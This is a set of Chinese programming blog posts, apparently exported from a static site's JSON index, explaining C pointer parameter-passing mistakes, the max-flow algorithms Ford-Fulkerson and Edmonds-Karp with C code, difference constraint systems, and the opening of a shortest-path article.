栈区由编译器自动分配和释放，存放函数的参数值，局部变量值等，下面称之为系统栈，因为由编译器环境系统为其分配。 堆区由程序员通过malloc, realloc, calloc分配和释放，若程序员申请堆空间后不free，程序结束时可能由操作系统回收。堆区的内存空间分配类似数据结构中的链表和散列表结合，在可用的内存/虚拟内存空间中寻找一块足够大的、满足malloc等分配函数要求的空间，标记该块空间为已使用，并返回该块空间的首地址。 全局区/静态区存放全局变量和静态变量，其中在代码中初始化的全局变量和静态变量在一块区域，未初始化的全局变量和未初始化的静态变量在相邻的另一块区域。程序结束后该区域由系统释放。 文字常量区，存放const常量、字符串等。程序结束后由系统释放。 程序代码区，存放函数体的二进制代码。 按值传递 C语言没有C++的按引用传递，要在子函数中修改父函数里声明的局部变量，需要将该变量的地址作为参数传入子函数，在子函数中通过类似(*str)的方法修改str指向的内存中存储的值。 一个简单的测试如下 123456789void func1( int a )&#123; a = 1;&#125;int main()&#123; int a = 2; func1(a); /* 传递a的拷贝 */ printf(\"%d\\n\", a); return 0;&#125; 测试结果a=2，在调用func1时参数为按值传递，传入的a是main函数中声明的a变量的一个拷贝，将其称为a’。在系统栈中，a属于main函数在栈中的空间，而a’属于func1在系统栈中的空间。在func1中修改a’不会影响到main函数中a的内存域。正确的传参做法应修改如下。 123456789void func1( int * a )&#123; /* 接收的参数类型为int *，代表一个指向int型的指针，也可认为是一个指向内存中int型大小空间开头的地址 */ *a = 1; /* 将a中存储的地址指向的内存空间赋值为1，若int为4个字节，则该块内存赋值后为 0x00000001 */&#125;int main()&#123; int a = 2; func1(&amp;a); /* 传递a的地址的拷贝 */ printf(\"%d\\n\",a); return 0;&#125; 测试结果a=1。注意此处调用func1时仍然是按值传递，但func1接收的参数类型不再是int，而是int * ，即指向int类型空间的地址，main函数里func1(&amp;a)，是传入了一份(&amp;a)的拷贝。在系统栈中，&amp;a指向了main函数中变量a所占的内存地址。上面正确传参做法中注释部分，&amp;a其实也可以视为一个变量，这个变量的类型是int * ，是一个指向int的指针。因而向func1传入的(&amp;a)的拷贝(&amp;a)’，其实就相当于传入了一个int * 类型变量的拷贝。(&amp;a)’和(&amp;a)存的值是相同的，但它们分别占据了系统栈中不同的内存空间，如果修改上述程序如下： 12345678910void func1( int * a, int * b )&#123; a = b;&#125;int main()&#123; int a = 1, b = 2; printf(\"%d %d\\n\", &amp;a, &amp;b); func1( &amp;a, &amp;b); printf(\"%d %d\\n\", &amp;a, &amp;b); return 0;&#125; 得到的运行结果不定（在不同时间、不同计算机上执行，内存地址不同），但格式类似如下： 1234[forec@forec ~]$ gcc wrongparameter2.c -o t[forec@forec ~]$ ./t493409228 493409224493409228 1 上面运行结果说明，main函数中的&amp;a在执行func1前后没有变化，这和最初给出的错误传参做法是一致的，将父函数中a的地址&amp;a作为参数传入子函数，子函数无法修改&amp;a的值（也就是main里变量a的地址），只能修改&amp;a指向的内存块的值。 错误传参测试一维数组在子函数中动态分配下面给出一种错误的一维数组动态分配示例。 1234567891011121314151617181920212223242526272829#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func1(int * str1)&#123; int i; puts(\"starting malloc str1 with 10 * int ...\"); str1 = (int*)malloc(sizeof(int)*10); printf(\"In func1, after malloc, the value of str1 is %d\\n\", str1 ); for ( i = 0 ; i &lt; 10 ; i++ ) str1[i] = i; puts(\"In func1, the value of str1[] is\"); for ( i = 0 ; i &lt; 10 ; i++ ) printf(\"%d \",str1[i]); putchar('\\n');&#125;int main()&#123; int * str, i; puts(\"Before func1, the value of array str is\"); for ( i = 0 ; i &lt; 10 ; i++ ) printf(\"%d \", str[i] ); putchar('\\n'); printf(\"In main function, str is %d\\n\", str ); func1(str); printf(\"After func1, str is %d\\n\", str ); puts(\"After func1, the value of array str is\"); for ( i = 0 ; i &lt; 10 ; i++ ) printf(\"%d \", str[i] ); putchar('\\n'); return 0;&#125; 执行上面的代码，运行结果如下 12345678910Before func1, the value of array str is1 0 -649909861 32764 0 0 -649909857 32764 -649909841 32764 In main function, str is -649916608starting malloc str1 with 10 * int ...In func1, after malloc, the value of str1 is 30027792In func1, the value of str1[] is0 1 2 3 4 5 6 7 8 9 After func1, str is -649916608After func1, the value of array str is1 0 -649909861 32764 0 0 -649909857 32764 -649909841 32764 在代码中，为了突出区分str和传给func1的str的拷贝，将func1的参数用str1表示。可以看出，str的值（str是一个int * 变量，其值就是指向的int型的指针）在func1前后都没有变化，func1函数中变化的仅仅是str的拷贝str1。因此上面代码的传参方法有误。可行的传参方法有下面两种，下面的第一种是正确的，第二种在C语言中可行，因为C语言不存在垃圾回收，但这种习惯不好，容易造成野指针。并且在支持垃圾回收的语言中，函数结束后会释放函数执行过程中产生的垃圾。 可行做法1 12345678910111213141516171819void func1(int ** str1)&#123; /* 要为int *类型赋值，传入int** */ int i; puts(\"starting malloc str1 with 10 * int ...\"); *str1 = (int*)malloc(sizeof(int)*10); printf(\"In func1, after malloc, the value of str1 is %d\\n\", *str1 ); for ( i = 0 ; i &lt; 10 ; i++ ) (*str1)[i] = i; puts(\"In func1, the value of str1[] is\"); for ( i = 0 ; i &lt; 10 ; i++ ) printf(\"%d \",(*str1)[i]); putchar('\\n');&#125;int main()&#123; int * str, i; ...... func1(&amp;str); /* 传入指针str所在的地址 */ ...... return 0;&#125; 上面代码和之前代码的不同之处在于，func1的接收参数变为了 int ** 类型，是一个指向int型指针的指针，因此向func1传入str的地址，就可以在func1里修改str的值。在func1中，要修改main中str的值，只需要对( * str1)进行操作。运行结果如下。 12345678910Before func1, the value of array str is1 0 -1242502757 32767 0 0 -1242502753 32767 -1242502737 32767 In main function, str is -1242510416starting malloc str1 with 10 * int ...In func1, after malloc, the value of str1 is 28885008In func1, the value of str1[] is0 1 2 3 4 5 6 7 8 9 After func1, str is 28885008After func1, the value of array str is0 1 2 3 4 5 6 7 8 9 可行做法2 1234567891011int * func1( int * str )&#123; ...... return str;&#125;int main()&#123; int * str, i; ...... str = func1( str ); ...... return 0;&#125; 为func1设一个int *类型的返回值，之所以func1对str1的修改无法影响str，是因为str1仅仅是str的拷贝。因此在func1结束时把str1返回，并赋值给str。运行结果和上面的做法1相同。 二维数组在子函数中动态分配这类错误引发的主要场景在二维数组，尤其是结构体数组的分配上。考虑下面测试代码。 123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void func2(int ** str2)&#123; str2 = (int**)malloc(sizeof(int*)*10); printf(\"In func2, the value of str2 is %d\\n\",str2); int i, j; for ( i = 0; i &lt; 10; i++)&#123; str2[i] = (int *)malloc(sizeof(int)*10); printf(\" The value of str2[%d] is %d\\n\", i, str2[i]); printf(\"And the value of the array is \"); for ( j = 0 ; j &lt; 10 ; j++ )&#123; str2[i][j] = i * 10 + j; printf(\"%d \", str2[i][j]); &#125; putchar('\\n'); &#125;&#125;int main()&#123; int ** str2; /* str2 is stored in stack, which was not initialized */ int i, j ; printf(\"Before run func2, the str2 is %d\\n\", str2); func2(str2); printf(\"After run func2, return to main, the str2 is %d\\n\", str2); for ( i = 0 ; i &lt; 10 ; i++ ) printf(\"str2[i] is %d\\n\", str2[i]); puts(\"The value of total str2 is :\"); for ( i = 0 ; i &lt; 10 ; i++ )&#123; for ( j = 0 ; j &lt; 10 ; j++ ) printf(\"%d \", str2[i][j]); putchar('\\n'); &#125; return 0;&#125; 运行结果如下 1234567891011121314151617181920212223242526272829303132333435Before run func2, the str2 is -1427732048In func2, the value of str2 is 10940432 The value of str2[0] is 10940528And the value of the array is 0 1 2 3 4 5 6 7 8 9 The value of str2[1] is 10940576And the value of the array is 10 11 12 13 14 15 16 17 18 19 The value of str2[2] is 10940624And the value of the array is 20 21 22 23 24 25 26 27 28 29 The value of str2[3] is 10940672And the value of the array is 30 31 32 33 34 35 36 37 38 39 The value of str2[4] is 10940720And the value of the array is 40 41 42 43 44 45 46 47 48 49 The value of str2[5] is 10940768And the value of the array is 50 51 52 53 54 55 56 57 58 59 The value of str2[6] is 10940816And the value of the array is 60 61 62 63 64 65 66 67 68 69 The value of str2[7] is 10940864And the value of the array is 70 71 72 73 74 75 76 77 78 79 The value of str2[8] is 10940912And the value of the array is 80 81 82 83 84 85 86 87 88 89 The value of str2[9] is 10940960And the value of the array is 90 91 92 93 94 95 96 97 98 99 After run func2, return to main, the str2 is -1427732048str2[i] is 1str2[i] is -1427727973str2[i] is 0str2[i] is -1427727969str2[i] is -1427727953str2[i] is -1427727942str2[i] is -1427727925str2[i] is -1427727831str2[i] is -1427727796str2[i] is -1427727780The value of total str2 is :段错误 (核心已转储) 可以看出，main中的str2并没有受func2执行的影响。联系上面一维数组的动态分配，可以联想到，要么让func2返回str2的值，要么传入str2的地址，而func2接收int * 类型的参数。 正确做法1 1234567891011121314151617181920212223void func2(int *** str2)&#123; *str2 = (int**)malloc(sizeof(int*)*10); printf(\"In func2, the value of str2 is %d\\n\",*str2); int i, j; for ( i = 0; i &lt; 10; i++)&#123; (*str2)[i] = (int *)malloc(sizeof(int)*10); printf(\" The value of str2[%d] is %d\\n\", i, (*str2)[i]); printf(\"And the value of the array is \"); for ( j = 0 ; j &lt; 10 ; j++ )&#123; (*str2)[i][j] = i * 10 + j; printf(\"%d \", (*str2)[i][j]); &#125; putchar('\\n'); &#125;&#125;int main()&#123; int ** str2, i, j; ...... func2(&amp;str2); ...... return 0;&#125; 正确做法2 1234int ** func2(int ** str2)&#123; ...... return str2;&#125; 野指针对malloc分配的堆空间，free对应的首地址后一定要将指针变量赋为NULL。如p = ( int * )malloc(sizeof(int) * 10)，若free(p)，则一定要 p = NULL，否则p指向的内存空间已经释放，而p指向了垃圾内存，成为野指针。再次调用p会引发不允许的内存访问。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/12/28/parameter-error/) 、作者信息（Forec）和本声明。","categories":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}],"tags":[{"name":"Mistakes","slug":"Mistakes","permalink":"http://forec.github.io/tags/Mistakes/"}],"keywords":[{"name":"Language","slug":"Language","permalink":"http://forec.github.io/categories/Language/"}]},{"title":"最大流（一）","slug":"Graph-Algorithms7-flow","date":"2015-12-25T00:43:42.000Z","updated":"2017-02-08T13:13:56.000Z","comments":true,"path":"2015/12/25/Graph-Algorithms7-flow/","link":"","permalink":"http://forec.github.io/2015/12/25/Graph-Algorithms7-flow/","excerpt":"简述最大流问题，给出一种解决最大流的最简单方法，及在二分图匹配中的应用。","text":"简述最大流问题，给出一种解决最大流的最简单方法，及在二分图匹配中的应用。 流网络 流网络G=（V，E）是一个有向图，E中的每条边（u，v）均有一个非负容量c（u，v）&gt;=0，对于不属于E中的边（u，v），则c（u，v）=0。流网络中有源点s和汇点t，方便起见假设每个顶点都处在从源点s到汇点t的某条路径上，也就是说对每个V中的顶点v，都有s～&gt;v~&gt;t的路径存在。因此，图G为连通图，并且|E|&gt;=|V|-1。流网络具备三个基本性质。 容量限制：对于所有V中的顶点u,v，都有f(u,v) &lt;= c(u,v)。 反对称性：对于所有V中的顶点u,v，都有f(u,v) = -f(v,u)。 流守恒性：对所有V中的非s、t顶点u，都有Sum{ f(u,v)，v为V中全部顶点 }= 0。f(u,v)称为从顶点u到顶点v的流，它可以为正、负或零。流f的值的定义为|f| = Sum{ f(s,v)，v为V中所有顶点 }，也就是从源点s出发的总流量，|f|表示流的值，而不是绝对值。 流网络性质的解释：容量限制说明从一个顶点到另一个顶点的网络流不能超过设定的容量。反对称性说明从顶点u到顶点v的流是其反向流的负值。流守恒性说明从非源点或非汇点的顶点出发的总网络流为0，也可以说，除s和t外，进入一个顶点的总流为0，可以阐述为流进等于流出。 最大流问题：给出一个具有源点s和汇点t的流网络G，找出从s到t的最大流值。举个例子说明，下图是一个简单的流网络，从源点s到汇点t的最大流为5，将有向边想象成城市间的公路，该流网络就转化为城市间的物流问题。另外，图中不存在双向边，假如为图中权值为6的有向边配备一条“反向通道”，该反向通道的权值为3，也就是城市间可以相互运输，则可以利用抵消处理将反向通道剔除。因为运输同一种物品，从u到v运送6个，从v到u运送3个，实质相当于从u到v运送6-3=3个，因此任意顶点间流传输问题都可以通过抵消转化为单向传输问题：只沿正向流的方向传输。 多个源点或多个汇点：考虑上一篇差分约束系统，我们通过构造了一个额外的源点s0得到了差分约束系统的最短路模型。在最大流问题中，如果出现多个源点或者多个汇点，可以为其增加一个超级源点s0或超级汇点t0,并将s0和所有源点si相连，权值为正无穷，将所有汇点ti和超级汇点t0相连，权值为正无穷。问题就转化为从超级源点s0到超级汇点t0的最大流问题。 隐含求和记号简化流网络的表达：使用函数f，f的任意自变量都可以是顶点的集合，表示的值为自变量代表的元素所有可能求和情况，例如f(X,Y) = Sum{ f(x,y) ，x in X and y in Y }。因此流守恒可以表示为f(u,V) = 0，流的值|f| = f(s,V) = f(V,t)。对于下面几个恒等式，建议参考基尔霍夫第一第二定律证明。（1）对于所有的X包含于V，f(X, X) = 0，（2）对所有X，Y包含于V，f(X, Y) = -f(Y,X)，（3）对所有X,Y,Z包含于V，其中X and Y = None，有f(X or Y, Z) = f(X, Z)+f(Y, Z)，f(Z, X or Y) = f(Z, X)+f(Z, Y)。 Ford-Fulkerson方法方法解释和定理 最大流问题的Ford-Fulkerson方法包含多种不同运行时间的实现，其依赖于三种流网络中常见的思想：残留网络（residual network），增广路径（augmenting path）和割（cut）。Ford-Fulkerson方法是一种迭代方法，开始时对所有V中的u，v有f(u,v)=0，即初始状态时流的值为0。每次迭代可以通过寻找一条“增广路径”来增加流值。增广路径时从源点s到汇点t的一条路径，沿着该路径可以向现有流量压入更多流值。反复进行该过程，直到所有增广路径都被寻找出。后面将证明算法的正确性。 12345FORD-FULKERSON-METHORD(G, s, t) initialize flow f to 0 while there exists an augmenting path p do augment flow f along p return f 残留网络：给定一个流网络G和一个流f，该流网络在此流基础上的残留网络Gf由可以容纳更多网络流的边组成。举例来说，有一个流网络G=（V,E），源点s汇点t，设f是G中的一个流，考察V中一对顶点u，v，在不超过容量c(u,v)的条件下，从u到v可以压入额外的网络流量，就是(u,v)的残留容量，即cf(u,v) = c(u,v) - f(u,v)。在残留网络Gf中，每条残留边都能容纳一个严格为正的网络流。定义Ef为残留网络的边集，Ef中的边既可以是E中的边，也可以是它们的反向边。如果E中存在边（u，v）并且f(u,v) 0，并且若f(u,v)&gt;0，则f(v,u)0，因此(u,v)的反向边(v,u)也存在于Ef中。对于一对顶点(u,v)，只有在初始网络中存在连接两个顶点的边，则残留网络中才能出现连接这两点的边，因此|Ef| &lt;= 2|E|。残留网络中的流和初始网络中的流的关系为|f+f’| = |f|+|f’|。 增广路径：增广路径p是残留网络Gf中从s到t的一条简单路径，增广路径上的每条边(u, v)可以容纳从u到v的某额外正网络流。称能够沿一条增广路径p的每条边传输的网络流的最大量为p的残留容量，cf(p) = min{ cf(u,v), (u,v) in p }。在已有流f的基础上加上fp，则可以得到G的另一个流，且新流的流值更接近最大值，因为|fp|为正，|f| + |fp|&gt;|f|。 流网络的割：Ford-Fulkerson方法沿增广路径反复增加流，直到找到最大流。流网络G=(V,E)的割（S，T）将V划分为S和T=V-S两部分，这里的划分类似于最小生成树中的点集划分，但此处针对的是有向图而非无向图。对于一个流f，穿过割（S，T）的净流量被定义为f(S,T)，割(S,T)的容量为c(S, T)，一个网络的最小割是网络中所有割中具有最小容量的割。对于最大流问题介绍中的图片，假如将左侧的s和距离其最近的顶点划分为S，剩下的两个顶点（含t）划分为T，则通过该割的净流量为2+3=5，2是图中最顶部顶点向t提供的流，3是s向图中最底部顶点提供的流。该割的容量为3+1+6=10。通过割的净流量可能包括顶点间的负网络流，但割的容量完全由非负值组成，即通过割（S，T）的净流由双向的正网络流组成，用从S到T的正网络流减去从T到S的正网络流；而割（S，T）的容量仅由从S到T的边计算而得，从T到S的边在计算c（S，T）时不包含在内。可以证明，流经任意割的净流都是相同的，且f(S,T) = |f|。证明如下：根据流守恒性，f(S-s,V) = 0，因此f(S,T) = f(S,V)-f(S,S) = f(S,V) = f(s,V)+f(S-s,V) = f(s,V) = |f|。还可以证明，对一个流网络G中任意流f来说，其值的上界为G的任意割的容量，即|f|=f(S, T) = Sum{ f(u, v), u in S, v in T } &lt;= Sum{ c(u, v), u in S, v in T } = c(S，T)。从该式可以直接得出一个结论，网络的最大流必定不超过此网络最小割的容量。 最大流最小割定理：如果f是具有源点s和汇点t的流网络G=（V，E）中的一个流，则下列条件等价：（1）f是G的一个最大流，（2）残留网络Gf不包含增广路径，（3）对G的某个割（S，T），有|f|=c（S，T）。结合上面提到的网络的最大流不超过此网络最小割的容量，可以得出网络的最大流等于某一最小割的容量。证明如下。 (1)-&gt;(2)：假设f是G的最大流，而Gf包含一条增广路径p，因此流的和f+fp是G的一个流，并且由增广路径的定义，f+fp的流值严格大于|f|，这与假设矛盾。 (2)-&gt;(3)：假设Gf不包含增广路径，即Gf不包含从s到v的路径。定义S={ v in V且Gf中从s到v存在路径 }，T=V-S。对于这样的割（S，T），s在S中，t在T中，并且对每对顶点(u, v)，都有f(u,v) = c(u,v)，否则(u,v)属于Ef，v就属于了集合S，这和前提矛盾。因此|f| = f(S, T) = c(S, T)。 (3)-&gt;(1)：对所有割（S，T），都有f&lt;=c(S,T)，因此条件|f| = c(S, T)说明此时f是一个最大流。 基本的Ford-Fulkerson算法实现 在Ford-Fulkerson方法的每次迭代中，找出任意增广路径p，并把沿p每条边的流f加上其残留容量cf（p）。下面的实现中，通过更新有边相连的每对顶点间的网络流来计算最大流。如果一对顶点间在任意方向都没有边相连，则隐含假设该对顶点间的f = 0。 123456789FORD-FULKERSON(G, s, t) for each edge(u, v) in E(G): f[u][v] &lt;- 0 f[v][u] &lt;- 0 while there exists a path p from s to t in the residual network Gf: cf(p) &lt;- min&#123; cf(u, v): (u, v) is in p &#125; for each edge(u, v) in p: f[u][v] &lt;- f[u][v] + cf(p) f[v][u] &lt;- -f[u][v] 上述基本实现方法，运行时间取决于如何确定第四行中的增广路径，如果选择不好，在边权有无理数的情况下算法可能不会终止：流的值随着求和运算不断增加，但始终无法收敛到流的最大值。若采用广度优先搜索来选择增广路径，则算法运行时间为多项式复杂度。通常情况下算法处理的问题中权值都为整数，如果是有理数可以按照一定比例转化为整数。在整数条件下，该种实现Ford-Fulkerson算法的运行时间为O(E|f|)，其中f是算法求出的最大流，原因在于第7行的循环为E次，寻找一条增广路径需要的深度优先搜索为E复杂度，而while最多执行f次，每次至少增加流值1个单位。在f较小时可以取得不错的运行效果，但当流网络中的最大流f*很大，例如我们将上面示例图中除了中间那条权值为1的边之外的其他边，权值都设为1000000，显然最大流为2000000,但增广路径会在权值为1的边上往返出现，因此一共要运行2000000×5次。 Edmonds-Karp算法 如果在第四行用BFS实现对增广路径p的计算，即若增广路径时残留网络中从s到t的最短路径（每条边设为单位距离），则能改进Ford-Fulkerson的界，该种实现方法为Edmonds-Karp算法，运行时间为O(VE^2)。令R（u，v）表示每条边为单位长度的图Gf中，从u到v的最短路径长度。下证时间复杂度。 对具有源点s和汇点t的流网络G=（V，E）运行Edmonds-Karp算法，对所有非源非汇点顶点v，残留网络Gf中的最短路径长度R（u，v）随着每个流的增加而单调递增。假设这个顶点v的流增加引起了从s到v的最短路径的减少，下面会推出矛盾。假设f是第一次流增加之前的流，该增加导致了某个最短路径距离的减小；设f’时增加以后的流。设v是在流增加时最小距离Rf’（u，v）被减小的顶点，因此Rf’（s，v）&lt; Rf（s，v）。设p=s～&gt;u-&gt;v是Gf’中从s到v的最短路径，因此（u，v）在Ef’中，且Rf’（s，u）=Rf’（s，v）-1。顶点u到s的距离不会因为v的流增加而减小，因此Rf’（s，u）&gt;=Rf（s，u）。可以断言（u，v）不属于Ef，否则根据三角不等式有Rf（s，v）&lt;=Rf（s，u）+1 &lt;= Rf’（s，u）+1 = Rf’（s，v），这和假设Rf’（s，v）&lt;Rf(s,v)矛盾。因此，如果有（u，v）不在Ef中而在Ef’中，只有流从v向u增加。Edmonds-Karp算法总是沿着最短路径增加流，因此Gf中从s到u的最短路径以（v，u）作为最后一条边。因此Rf（s，v）=Rf（s，u）-1&lt;=Rf’（s，u）-1=Rf’（s，v）-2。因为开始假设Rf’（s，v）&lt;Rf（s，v），因此假设矛盾。 对具有源点s和汇点t的一个流网络G=（V，E）运行Edmonds-Karp算法，对流进行增加的全部次数为O(VE)。在一个残留网络Gf中，如果其增广路径p的残留容量是边（u，v）的残留容量，即cf（p）=cf（u，v），称此边（u，v）对增广路径p关键。在沿增广路径p增流后，路径p上的任何关键边都从残留网络中消失。此外，任何增广路径上都至少有一条关键边。下证|E|条边中每一条都可以至多|V|/2-1次成为关键边。设u，v为V中顶点，且它们之间由E中的一条边相连，由于增广路径为最短路径，因此（u，v）第一次作为关键边时，有Rf（s，v）=f（s，u）+1。一旦对流增加，边（u，v）立刻从残留网络中消失，直到从v到u的边出现增流，才会使（u，v）再次出现在增广路径上。假设此时G的流为f’，则Rf’（s，u）=Rf’（s，v）+1，又Rf（s，v）&lt;=Rf’（s，v），得Rf’（s，u）=Rf’（s，v）+1&gt;=Rf（s，v）+1=Rf（s，u）+2。因此对于边（u，v），从其成为关键边到再次成为关键边，源点到u的最短距离至少增加2，初始时从源点到u的距离至少为0。因此在u变为从s不可达之前，距离至多为|V|-2（排除s和t），因此在（u，v）第一次成为关键边后，至多还能成为关键边(|V|-2)/2次，总计至多|V|/2次。在残留网络中可能有O（E）对顶点间有边相连，因此全部关键边的数目规模为O（VE）。 Edmonds-Karp邻接表实现12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;memory.h&gt;#define INF 0x7fffffff#define N 101int map[N][N];int visited[N], pre[N];int V, E, s, t;void init()&#123; scanf(\"%d %d\", &amp;V, &amp;E); int i, j, u, v, w; memset(map, 0, sizeof(map)); for ( i = 0 ; i &lt; E; i++ )&#123; scanf(\"%d %d %d\", &amp;u, &amp;v, &amp;w ); if ( map[v][u] != 0 ) map[v][u] -= w; else map[u][v] = w; &#125; scanf(\"%d %d\",&amp;s, &amp;t);&#125;int cf( int source, int end )&#123; int p = end, min = INF; while ( p != source )&#123; min = ( min &gt; map[pre[p]][p] ? map[pre[p]][p] : min ); p = pre[p]; &#125; return min;&#125;int BFS( int source, int end )&#123; int * stack = ( int * ) malloc ( sizeof( int ) * V ), i; memset(visited, 0, sizeof(visited)); int front = 0, rear = 0; stack[rear++] = source; visited[source] = 1; pre[source] = source; while ( front != rear )&#123; int s = stack[front++]; for ( i = 0 ; i &lt; V ; i++ )&#123; if ( !visited[i] &amp;&amp; map[s][i] )&#123; stack[rear++] = i; visited[i] = 1; pre[i] = s; if ( i == end)&#123; free(stack); return 1; &#125; &#125; &#125; &#125; free(stack); return 0;&#125;int maxFlow( int source, int end )&#123; int flow = 0; while ( BFS( source, end ) )&#123; int cfp = cf( source, end ); flow += cfp; int p = end; while ( p != source )&#123; map[pre[p]][p] = map[pre[p]][p] - cfp; map[p][pre[p]] += cfp; p = pre[p]; &#125; &#125; return flow;&#125;int main()&#123; init(); printf(\"maxFlow:%d\\n\", maxFlow(s,t)); return 0;&#125; 转化为最大流问题的最大无向二分图匹配问题 最大无向二分图匹配问题：给定一个无向图G=（V，E），一个匹配是边集E的子集，令匹配为M，满足对所有V中顶点v，M中至多有一条边和v相关联。若M中有边和v关联，则称v被匹配，否则v是无匹配的。最大匹配是求解最大势的匹配，即让|M|最大。假定顶点集合V可以被划分为L和R两部分，L和R不相交，且E中的所有边均为一个顶点在L中，另一个顶点在R中，则该图为二分图。方便起见假设该图每个顶点都至少有一条关联的边。 为该无向二分图建立流网络，其中最大流对应最大匹配的数量。二分图G对应的流网络G’=（V’，E’）定义如下：设源点s和汇点t不属于V，在V’中向V加入超级源点s和超级汇点t，从s引出|L|条有向边，分别指向L中的每个顶点，R中的每个顶点也均引出一条指向t的有向边。此外在G中，L和R之间的|E|条边，均在G’中成为自L指向R的|E|条有向边。所有边均赋予单位容量。因为V中每个顶点都至少有一条关联边，因此|E|&gt;=|V|/2，所以|E|&lt;=|E’|=|E|+|V|&lt;=3|E|，因此|E’|的规模为O(E)。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2015/12/25/Graph-Algorithms7-flow/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"差分约束系统","slug":"Graph-Algorithms6","date":"2015-12-24T02:32:37.000Z","updated":"2016-11-04T16:22:06.000Z","comments":true,"path":"2015/12/24/Graph-Algorithms6/","link":"","permalink":"http://forec.github.io/2015/12/24/Graph-Algorithms6/","excerpt":"差分约束的最短路径算法证明和解释。","text":"差分约束的最短路径算法证明和解释。 差分约束系统 差分约束系统用一个m×n的线性规划矩阵表示m个不等式，这m个不等式中共n个变量x1,x2,…,xn，每个不等式满足如下形式：xi - xj &lt;= bk（1 &lt;= i, j &lt;= n, 1 &lt;= k &lt;= m），在矩阵中的表示为，每一行都有一个1和一个-1,其他元素都为0。例如1-10001000-10100-1-10100-1001000-11000-100000-11用上面的矩阵乘一个n×1的变量矩阵x = (xi)，使其满足一个m×1的常数矩阵（bk）。等价于找出下面8个不等式的可行解：x1 - x2 &lt;= b1; x1 - x5 &lt;= b2; x2 - x5 &lt;= b3; x3 - x1 &lt;= b4; x4 - x1 &lt;= b5; x4 - x1 &lt;= b6; x5 - x3 &lt;= b7; x5 - x4 &lt;= b8。对于bk = (0, -1, 1, 5, 4, -1, -3, -3)的一个序列，x的一个可行解为(-5, -3, 0, -1, -4)，同样，对于任意x’ = x+d，d为任意常数，x’也是该不等式组的一组解。 约束图 观察差分约束系统的不等式，发现其与最短路径松弛操作相似。松弛操作的判断条件是d[v] &lt;= d[u] + w(u, v)，差分约束方程中为xi - xj &lt;= bk，因此xi &lt;=&gt; d[v]，xj &lt;=&gt; d[u]，w(u, v) &lt;=&gt; bk，据此建边vj-&gt;vi，权值为bk，变量x1,x2,…,xn分别对应结点s1,s2,s3,…,sn。 在上述图中，附加一个源点s0,将其与所有顶点相连，并将s0的所有出边权值均设为0。下面将证明，给定一个差分约束系统Ax&lt;=b，设G=(V,E)为该系统对应的约束图，则如果G不包含负权环，从s0到其它各点的最短路径权值就是一组可行解，否则此系统不存在可行解。证明过程如下：当G不包含负权回路时，对于任意边(vi, vj)，根据三角不等式d[vj] &lt;= d[vi] + w(vi, vj)，设d[vi] = xi， d[vj] = xj，那么xj - xi &lt;= w(vi , vj)，因此满足对应边（vi, vj）的差分约束。而当G中包含负权回路时，假设负权回路为，其中v1 = vk（源点s0没有入边，不可能出现在负权环上），因此整个负权环对应如下的差分约束：x2 - x1 &lt;= w(v1,v2)；x3 - x2 &lt;= w(v2, v3);…;xk - xk-1 &lt;= w(vk-1, vk)，将这k-1个不等式相加，则左边为0,而右边是负数，矛盾。因此不存在解。 最大解与最小解 当差分约束条件给出其中一个解xi，即固定解的一个元素，求解的其他元素所能取到的最大解或最小解。在约束图的创建中，我们将从源点引出的边权值都赋为0,其实隐含着：d[vi] - d[v0] &lt;= 0这样的条件，因此求出的解一定小于等于零，如果我们把s0也看作一个变量x0,那么上面例子中的解就是(0, -5, -3, 0, -1, -4)，也就是预先指定了x0的解为0。这里的x0就是源点s0的偏移量，例如当题中增加条件，要求解的所有元素都小于某个值，此时只要将该值设置为s0的偏移量即可。 对于这类有一个未知数已经定死的情况，还有一个性质：通过最短路径算法求出的一组解是所有解中的最大值。考虑到Bellman-Ford等单源最短路径算法的初始化都是d[vi] = 正无穷，通过各种约束条件使d[vi]的值不短减小来满足，因此当所有约束条件都满足，无法松弛任意边时，求出的解就是最大解。同样，如果要求所求得的解是所有解中的最小解，只要将问题转化为求解最长路径，松弛条件变为d[v] &gt;= d[u] + w(u, v)，此时的不等式变为xj - xi &gt;= -bk，因此建边vi-&gt;vj，权值为-bk，求其最长路径，即为最小值。 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(http://forec.github.io/2015/12/24/Graph-Algorithms6/) 、作者信息（Forec）和本声明。","categories":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"}],"keywords":[{"name":"Code","slug":"Code","permalink":"http://forec.github.io/categories/Code/"}]},{"title":"最短路径","slug":"Graph-Algorithms5","date":"2015-12-23T02:20:51.000Z","updated":"2016-11-04T13:56:16.000Z","comments":true,"path":"2015/12/23/Graph-Algorithms5/","link":"","permalink":"http://forec.github.io/2015/12/23/Graph-Algorithms5/","excerpt":"分析图论中各类最短路径问题的算法设计，给出 Bellman-Ford，Dijkstra，SPFA 和 Floyd-Warshall 算法描述与代码。","text":"分析图论中各类最短路径问题的算法设计，给出 Bellman-Ford，Dijkstra，SPFA 和 Floyd-Warshall 算法描述与代码。 问题分类 最短路径问题中，给出的是一个带权有向图G=（V，E），无向图可以认为是双向的有向图。加权函数w：E-&gt;R为从边到实型权值的映射，路径p=的权指其组成边的所有权值之和。定义从u到v的最短路径为所有从u到v的路径中权值最小的路径，若不存在从u到v的路径则权值为正无穷。 单源最短路径及其变体 单源最短路径：已知图G=（V，E），求从V中某个给定源点s到V中的其他所有顶点的最短路径。 单终点最短路径：将E反向，转化为单源最短路径。 单对顶点最短路径问题：对于某对给定顶点（u，v），找出u到v的最短路径。通常解决办法为找到u的单源最短路径。 